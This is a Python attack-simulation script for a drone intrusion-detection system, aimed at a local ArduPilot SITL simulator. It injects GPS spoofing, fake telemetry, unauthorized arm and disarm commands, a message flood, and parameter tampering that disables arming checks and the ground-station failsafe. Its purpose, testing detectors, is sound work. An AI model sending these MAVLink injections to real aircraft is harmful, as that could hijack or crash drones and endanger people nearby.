#!/usr/bin/env python3
"""
Drone IDS - Attack Simulation for SITL
Injects REAL malicious MAVLink messages that trigger detectors.
Runs all attack types by default.
"""
import logging
import sys
import time
from pathlib import Path

try:
    from pymavlink import mavutil
except ImportError:
    mavutil = None

sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from drone_ids.interfaces.mavlink_interface import MAVLinkInterface
from drone_ids.core.config import config

def get_time_ms():
    return int(time.time() * 1000) & 0xFFFFFFFF


def inject_spoofed_message(mavlink, msg_type, src_system=1, src_component=1, **kwargs):
    """Inject a MAVLink message spoofed from the autopilot (sys=1)."""
    # Create a raw MAVLink message with spoofed source system
    msg = mavlink.master.mav.__dict__[msg_type + '_encode'](**kwargs)
    # Override source system to appear as autopilot (1)
    msg._src_system = src_system
    msg._src_component = src_component
    mavlink.master.mav.send(msg)

def inject_fake_gps(mavlink, lat_offset=0.01, lon_offset=0.01) -> None:
    print("\nInjecting fake GPS_RAW_INT with 1km position jump...")
    for i in range(5):
        mavlink.master.mav.gps_raw_int_send(
            get_time_ms(),
            3,
            int((47.397742 + 0.01) * 1e7),
            int((8.545594 + 0.01) * 1e7),
            500000, 65535, 65535, 100, 65535, 12,
            0, 0, 0, 0, 0
        )
        time.sleep(0.1)
    print("  Injected 5 fake GPS messages with impossible position")

def inject_fake_attitude(mavlink) -> None:
    print("\nInjecting fake ATTITUDE with impossible 500 deg/s roll rate...")
    for i in range(10):
        mavlink.master.mav.attitude_send(get_time_ms(), 0.0, 0.0, 0.0, 8.72, 0.0, 0.0)
        time.sleep(0.05)
    print("  Injected 10 fake attitude messages with impossible roll rate")

def inject_impossible_position(mavlink) -> None:
    print("\nInjecting GLOBAL_POSITION_INT with impossible 200 m/s velocity...")
    for i in range(5):
        mavlink.master.mav.global_position_int_send(
            get_time_ms(),
            int(47.397742 * 1e7), int(8.545594 * 1e7),
            500000, 500000, 20000, 0, 0, 0
        )
        time.sleep(0.1)
    print("  Injected 5 fake position messages with impossible velocity")

def send_mavlink_command_unauthorized(mavlink, command: int, params: list, name: str) -> None:
    print(f"\nInjecting command: {name} (ID={command})")
    mavlink.master.mav.command_long_send(
        mavlink.master.target_system, mavlink.master.target_component,
        command, 0, *params
    )
    print(f"  Sent")
    time.sleep(0.3)

def flood_messages(mavlink, count=600) -> None:
    print(f"\nFlooding with {count} messages in <1 second...")
    start = time.time()
    for i in range(count):
        mavlink.master.mav.param_request_read_send(
            mavlink.master.target_system, mavlink.master.target_component,
            f"FLOOD_{i}".encode(), -1
        )
    elapsed = time.time() - start
    rate = count / elapsed
    print(f"  Sent {count} messages in {elapsed:.3f}s = {rate:.0f} msg/s")
    time.sleep(1.0)

def tamper_critical_params(mavlink) -> None:
    print("\nFirst reading current critical param values...")
    for param in ["SYSID_THISMAV", "ARMING_CHECK", "FS_GCS_ENABLE"]:
        mavlink.master.mav.param_request_read_send(
            mavlink.master.target_system, mavlink.master.target_component,
            param.encode(), -1
        )
    time.sleep(0.5)
    print("Now tampering with critical parameters...")
    for param, value in [("SYSID_THISMAV", 999), ("ARMING_CHECK", 0), ("FS_GCS_ENABLE", 0), ("GPS_TYPE", 99)]:
        print(f"  Setting {param} = {value}")
        mavlink.master.mav.param_set_send(
            mavlink.master.target_system, mavlink.master.target_component,
            param.encode(), float(value), mavutil.mavlink.MAV_PARAM_TYPE_INT32
        )
        time.sleep(0.2)

def cause_sequence_gaps(mavlink) -> None:
    print("\nCausing MAVLink sequence gaps...")
    for i in range(50):
        mavlink.master.mav.statustext_send(mavutil.mavlink.MAV_SEVERITY_INFO, f"GAP_TEST_{i}".encode())
    time.sleep(0.1)
    print("  Caused sequence gap by abrupt stop")

def run_all_attacks(mavlink) -> None:
    print("\n" + "#"*60)
    print("# DRONE IDS - FULL ATTACK DEMONSTRATION (REAL INJECTION)")
    print("#"*60)
    print("\nWaiting 3s for baseline learning...")
    time.sleep(3)
    
    print("\n" + "="*60)
    print("ATTACK 1: GPS SPOOFING")
    print("="*60)
    for i in range(5):
        mavlink.master.mav.gps_raw_int_send(get_time_ms(), 3,
            int((47.397742+0.01)*1e7), int((8.545594+0.01)*1e7),
            500000, 65535, 65535, 100, 65535, 12, 0, 0, 0, 0, 0)
        time.sleep(0.1)
    time.sleep(1.0)
    
    print("\n" + "="*60)
    print("ATTACK 2: TELEMETRY MANIPULATION")
    print("="*60)
    for i in range(10):
        mavlink.master.mav.attitude_send(get_time_ms(), 0.0, 0.0, 0.0, 8.72, 0.0, 0.0)
        time.sleep(0.05)
    time.sleep(0.5)
    for i in range(5):
        mavlink.master.mav.global_position_int_send(get_time_ms(),
            int(47.397742*1e7), int(8.545594*1e7), 500000, 500000, 20000, 0, 0, 0)
        time.sleep(0.1)
    time.sleep(1.0)
    
    print("\n" + "="*60)
    print("ATTACK 3: COMMAND INJECTION & PARAMETER TAMPERING")
    print("="*60)
    for cmd_id, params, name in [(400,[1,0,0,0,0,0,0],"ARM"),(400,[0,0,0,0,0,0,0],"DISARM"),(22,[1,0,0,0,0,0,0],"SET_MODE"),(176,[1,0,0,0,0,0,0],"DO_SET_HOME"),(21,[0,0,0,0,0,0,0],"PREFLIGHT_CALIBRATION")]:
        mavlink.master.mav.command_long_send(mavlink.master.target_system, mavlink.master.target_component, cmd_id, 0, *params)
        print(f"  Injected {name}")
        time.sleep(0.3)
    
    for param in ["SYSID_THISMAV", "ARMING_CHECK", "FS_GCS_ENABLE"]:
        mavlink.master.mav.param_request_read_send(mavlink.master.target_system, mavlink.master.target_component, param.encode(), -1)
    time.sleep(0.5)
    for param, value in [("SYSID_THISMAV",999),("ARMING_CHECK",0),("FS_GCS_ENABLE",0),("GPS_TYPE",99)]:
        print(f"  Setting {param} = {value}")
        mavlink.master.mav.param_set_send(mavlink.master.target_system, mavlink.master.target_component, param.encode(), float(value), mavutil.mavlink.MAV_PARAM_TYPE_INT32)
        time.sleep(0.2)
    time.sleep(1.0)
    
    print("\n" + "="*60)
    print("ATTACK 4: DoS - MESSAGE FLOOD")
    print("="*60)
    start = time.time()
    for i in range(600):
        mavlink.master.mav.param_request_read_send(mavlink.master.target_system, mavlink.master.target_component, f"FLOOD_{i}".encode(), -1)
    elapsed = time.time() - start
    rate = 600 / elapsed
    print(f"  Sent 600 messages in {elapsed:.3f}s = {rate:.0f} msg/s")
    time.sleep(1.0)
    
    print("\n" + "="*60)
    print("ATTACK 5: MAVLink SEQUENCE GAPS")
    print("="*60)
    for i in range(50):
        mavlink.master.mav.statustext_send(mavutil.mavlink.MAV_SEVERITY_INFO, f"GAP_TEST_{i}".encode())
    time.sleep(0.1)
    print("  Caused sequence gap by abrupt stop")
    time.sleep(1.0)
    
    print("\n" + "#"*60)
    print("# DEMONSTRATION COMPLETE - ALL ATTACKS INJECTED")
    print("#"*60)

def main():
    logging.basicConfig(level=logging.INFO)
    logger = logging.getLogger('drone_ids.attack_sim')
    config.load()
    default_conn = config.get('sitl.connection_string', 'udp:127.0.0.1:14550')
    logger.info(f"Connecting to SITL on {default_conn}...")
    mavlink = MAVLinkInterface(default_conn)
    if not mavlink.connect():
        print(f"Failed to connect to SITL. Ensure SITL is running on {default_conn}")
        sys.exit(1)
    logger.info("Connected to SITL. Starting REAL attack injection...")
    try:
        run_all_attacks(mavlink)
    except KeyboardInterrupt:
        logger.info("Interrupted by user")
    finally:
        mavlink.disconnect()
        logger.info("Disconnected from SITL")

if __name__ == '__main__':
    main()
